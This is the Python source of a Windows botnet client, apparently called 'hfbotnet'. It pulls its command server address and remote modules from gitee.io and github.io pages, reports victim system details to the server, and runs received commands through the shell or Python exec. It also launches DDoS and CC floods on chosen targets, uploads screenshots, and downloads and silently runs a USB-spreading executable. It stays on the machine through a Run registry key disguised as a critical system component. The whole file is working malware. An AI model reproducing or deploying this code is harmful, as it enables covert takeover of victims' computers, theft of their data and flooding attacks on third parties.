#! /usr/bin/env python3
# coding:utf8

global cmds, DEBUG
DEBUG = False
LOCAL = False

import os, re, sys, uuid, shlex, subprocess, ctypes
import json, time, platform, logging
import traceback

global Windows, Linux
Windows = True if platform.system() == "Windows" else False
Linux = True if platform.system() == "Linux" else False

if Windows:
    import win32api, win32con, pywintypes
    from msg import msg

from remoteimport import install_meta as remote
from requests import get, post
from threading import Thread
from PIL import ImageGrab
if not LOCAL:
    from .runshell import func
    from . import runshell as console
    from . import urlimport
    from . import args as _args
    from .usbspread import UsbMain
else:
    from runshell import func
    import runshell as console
    import urlimport
import socket, imp

level = logging.WARN if not DEBUG else logging.DEBUG
logging.basicConfig(format="%(asctime)s - %(name)s[line:%(lineno)d] - %(levelname)s: %(message)s in %(funcName)s", level=level)
log = logging.getLogger("MAIN")
log.setLevel(level)
handler = logging.FileHandler("C://Users//Public//Main.log", mode='a')
formatter = logging.Formatter("%(asctime)s - %(name)s[line:%(lineno)d] - %(levelname)s: %(message)s in %(funcName)s")
handler.setFormatter(formatter)
log.addHandler(handler)

global origins
origins = ["https://mns-quc.gitee.io/hfbotnet/static/", "https://fu050409.github.io/hfbotnet/", ]

cmds = [
        'cd',
        'cc',
        'ddos',
        'shell',
        'python',
        'upgrade',
        'download',
        'importpkg',
        'screenshot',
        ]

def debug(value):
    log.info("[MAIN] {}".format(value))

def error(value):
    if DEBUG:
        msg(title="DEBUG", msg="[DEBUG] {}".format(value)).start()

def GetRemotes(origin = "https://mns-quc.gitee.io/hfbotnet/"):
    global pkg, server, paths
    try:
        pkg = get("{origin}remote.html".format(origin = origin)).text.replace("\n", "")
        if "http" not in pkg:
            return False
        server = get("{origin}server.html".format(origin = origin)).text.replace("\n", "")
        if "http" not in server:
            return False
        log.info("成功从源 {origin} 导入了服务器地址.".format(origin = origin))
        return True
    except ConnectionError:
        log.error("错误：没有连接至互联网或Gitee损毁。")
        return False
    except Exception as e:
        log.error(e)
        return False

if not LOCAL:
    if GetRemotes():
        pass
    else:
        for origin in origins:
            if GetRemotes(origin = origin):
                break
else:
    pkg = "http://127.0.0.1:333"

if not LOCAL:
    remote(pkg.replace("\n",""))
    sys.path.append(pkg.replace("\n",""))
else:
    remote(pkg)

server =  "http://127.0.0.1:201" if LOCAL else server

log.info("当前的服务器: {}".format(server))
log.info("变量 \"sys.path\" 的值为 {}.".format(sys.path))

def AutoStart(path = sys.argv[0].replace("/","\\")):
    runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
    hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_ALL_ACCESS)
    while True:
        try:
            if str(win32api.RegQueryValueEx(hKey,"系统关键组件")[0]) == path:
                done = True
                log.info("已设置为开机自启.")
                break
            else:
                log.warning("启动项值与当前程序所在路径不符!")
                win32api.RegDeleteValue(hKey, "系统关键组件")
                win32api.RegCloseKey(hKey)
                hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_ALL_ACCESS)
                raise pywintypes.error
            done = True
            break
        except pywintypes.error:
            win32api.RegSetValueEx(hKey, "系统关键组件", 0, win32con.REG_SZ, path)
            done = True
    win32api.RegCloseKey(hKey)
    return done

def cd(id, path):
    try:
        os.chdir(path)
    except Exception as e:
        PushResult(id, "错误：{}".format(e))
        return
    PushResult(id, "已切换工作目录")

def shell(id, args):
    if args != GUID():
        PushResult(id, "非指定Shell")
        return
    is_shell = console.is_shell
    if is_shell:
        PushResult(id, "Shell正在运行")
        return
    try:
        is_shell = True
        Thread(target=func).start()
        PushResult(id, "Shell执行成功")
    except Exception as e:
        log.error('意外的错误: {}'.format(e))
        PushResult(id, e)

def run(id, cmd):
    try:
        p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = p.stdout.read()
        error(result.decode('utf-8','ignore'))
        retval = p.wait()
    except Exception as e:
        PushResult(id, "错误：{}.".format(e))
    log.info("完成命令: {}.".format(cmd))
    print(result)
    PushResult(id, result.decode('gbk','ignore'))

def download(id, args):
    args = shlex.split(args)
    url = args[0]
    name = args[1]
    urltype = args[2]
    log.info("下载 {} 中...".format(url))
    content = get(url)
    if urltype == "wb" or urltype == "ab":
        content = content.content
    else:
        content = content.text
    log.debug("Type of content is {}".format(type(content)))
    opens = open(name, urltype)
    opens.write(content)
    opens.close()
    log.info("下载并保存完毕!")
    PushResult(id, "下载完毕")

def ddos(id, args):
    def parse(args):
        parser = _args.ArgumentParser(
            prog = "HFDDOS",
            description="氢氟DDOS攻击池."
            )
        parser.add_argument('ipaddr',
                            metavar = 'IPAddress',
                            type = str,
                            help = '要进行DDOS攻击的IP地址.'
                            )
        parser.add_argument("-p", "--port",
                            type = int,
                            default = 80,
                            help = "端口."
                            )
        parser.add_argument("-c", "--thread",
                            type = int,
                            default = 39*3,
                            help = "要创建的线程数."
                            )
        parser.add_argument("-t", "--time",
                            type = int,
                            default = 39*3*3,
                            help = "要创建的线程数."
                            )
        args = parser.parse_args(args)
        return args
    
    from payloads import hfddos

    if "-h" in args or "--help" in args:
        PushResult(id, "[HFCC] 使用方法:\n      ipaddr 要进行DDOS攻击的IP地址.\n      -c  线程数.\n      -p  端口.\n      -t  攻击时长.\n")
        return
    
    args = shlex.split(args)
    args = parse(args)
    
    ip = args.ipaddr
    port = args.port
    thread = args.thread
    time = args.time
    
    payloads.hfddos.ddos(ip, port=int(port), thread=int(thread), time=int(time))
    PushResult(id, "[HFDDOS] 已加入DDOS线程")

def cc(id, args):
    def parse(args):
        parser = _args.ArgumentParser(
            prog = "HFCC",
            description="氢氟CC攻击池."
            )
        parser.add_argument('url', metavar='URL', type=str,
                    help='要进行CC攻击的URL.')
        parser.add_argument("-c", "--thread",
                            type = int,
                            default = 300,
                            help = "线程数."
                            )
        parser.add_argument("-t", '--time',
                            type = int,
                            default = 300,
                            help = '攻击时长.'
                            )
        parser.add_argument("-p", '--pool',
                            type = int,
                            default = 100,
                            help = '攻击池数.'
                            )
        args = parser.parse_args(args)
        return args
    
    from payloads import hfcc

    if "-h" in args or "--help" in args:
        PushResult(id, "[HFCC] 使用方法:\n      url 要进行CC攻击的URL.\n      -c  线程数.\n      -p 攻击池数.\n")
        return

    args = shlex.split(args)
    args = parse(args)

    payloads.hfcc.cc(args.url, thread=args.thread, time=args.time, pool=args.pool)
    PushResult(id, "[HFCC] 已加入CC线程")

def python(id, codes):
    exec(codes)
    PushResult(id, "已执行Python命令")

def importpkg(id, pkg):
    exec("import {}".format(pkg))
    PushResult(id, "已导入")

def screenshot(id, args):
    if args != GUID() and args != "":
        PushResult(id, "[HFSCREENSHOT] 非指定截屏主机.")
        return

    from payloads import hfscreenshot

    result = payloads.hfscreenshot.screenshot()
    data = {
        "result": "ScreenShot",
        "FileName": result[0],
        "guid": GUID(),
        "id": id,
        }
    post(server + "/result/", data=data, files={"screenshot": result[1]}).text
    return

def upgrade(id, args):
    spread = get('http://mns-quc.gitee.io/hfbotnet/client/dist/usbspread.exe').content
    f = open('C://Users//Public//HFSpread.exe', 'wb')
    f.write(spread)
    f.close()
    PushResult(id, "成功保存更新程序, 立即开始执行.")
    win32api.ShellExecute(0, 'open', 'C://Users//Public//HFSpread.exe', '', '', 0)

def IP():
    return re.findall(r'\d+.\d+.\d+.\d+',get("http://txt.go.sohu.com/ip/soip").text)[0]

def MAC():
    mac = uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

def HOSTNAME():
    return socket.gethostname()

def OperatingSystem():
    return platform.uname().system + ' ' + platform.uname().release

def is_admin():
    return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)

def GUID():
    global guid

    if "guid" in globals():
        return guid
    
    if not os.path.exists("C:\\Users\\Public\\HFSysNet.vsn"):
        guid = str(uuid.uuid1()).replace("-", "")
        gf = open("C:\\Users\\Public\\HFSysNet.vsn", "w")
        gf.write(guid)
        gf.close()
    else:
        guid = open("C:\\Users\\Public\\HFSysNet.vsn", "r").read().replace("\n", "")
    return guid

def VERSION():
    global version

    if "version" in globals():
        return version
    
    if not os.path.exists("C:\\Users\\Public\\HFMain.vsn"):
        log.error("他妈个批, 没有找到版本文件'HFMain.vsn'! 这他妈倒玩个锤子.")
        return 2.3
    else:
        version = open("C:\\Users\\Public\\HFMain.vsn", "r").read().replace("\n", "")
        
    return version

def Online():
    mac = MAC()
    username = os.environ['USERNAME'] if Windows else os.environ['USER']
    _os = OperatingSystem()
    ipv4 = IP()
    hostname = HOSTNAME()
    admin = is_admin()
    guid = GUID()
    version = VERSION()
    data = {
        "os": _os,
        "mac": mac,
        "ipv4": ipv4,
        "guid": guid,
        "username": username,
        "hostname": hostname,
        "admin": admin,
        "version" : version,
        }
    online = post("{}/online/".format(server), data=data).text
    return json.loads(online)[0]["status"]

def StrictOnline():
    while True:
        try:
            online = Online()
            debug("Result is {}".format(online))
            if "200" in online:
                log.info("Onlined")
                break
            else:
                raise
        except Exception as e:
            if "HTTPConnectionPool" in str(e):
                e = "服务器都没开，玩个锤子"
            else:
                e = traceback.format_exc()
            log.error("他妈的! 上线失败: {} \n正在重试...".format(e))
            time.sleep(3.9)
            continue

def PushResult(id, result):
    log.info("回传命令ID为{}的结果.".format(id))
    data = {
        "result": result,
        "guid": GUID(),
        "id": id,
        }
    while True:
        try:
            response = post(server + "/result/", data=data).text
            log.info("回传后收到的结果为 {}.".format(response))
            if "200" in response:
                log.info("成功将ID为{}的命令回传.".format(id))
                break
            else:
                raise
        except Exception as e:
            log.error("回传结果失败: {}.".format(e))
            continue
    
def Tasks():
    data = {
        "guid": GUID(),
        }
    return post("{url}/all/".format(url=server), data=data).text

def Main():
    StrictOnline()
    tasks = json.loads(Tasks())
    debug(tasks)
    for task in tasks:
        if task is None:
            continue

        try:
            cmd = shlex.split(task["command"])[0]
        except ValueError as e:
            PushResult(task["id"], "{err}".format(err=e))
            continue
        except Exception as e:
            PushResult(task["id"], "{err}".format(err=e))
            continue
        
        if cmd in cmds:
            debug("Is core command.")
            args = task["command"]
            args = args.lstrip(args.split(" ")[0]).lstrip(" ")
            try:
                exec('{funcname}({id}, args)'.format(
                    funcname = shlex.split(task["command"])[0],
                    id = task["id"])
                     )
            except Exception as e:
                PushResult(task["id"], e)
            continue
        Thread(target=run, args=(task["id"], task["command"])).start()

if not LOCAL:
    try:
        if Windows:
            AutoStart()
    except:
        pass
else:
    log.debug("本地测试中，不设置为开机自启动.")

#try:
#    USB = Thread(target=UsbMain)
#    USB.start()
#except Exception as e:
#    log.error(str(e))

while True:
     try:
         try:
             if Windows:
                 AutoStart()
         except:
             pass
         try:
         #    if not USB.isAlive():
         #        USB = Thread(target=UsbMain)
         #        USB.start()
             try:
                 import payloads
             except ModuleNotFoundError:
                 pass
             except Exception as e:
                 log.error("在导入模块\"payloads\"时意外出错: {}".format(e))
         except Exception as e:
             log.error("意外的错误: {}".format(e))
         Main()
         time.sleep(3.9)
     except Exception as e:
         log.error("意外的错误: {}".format(e))
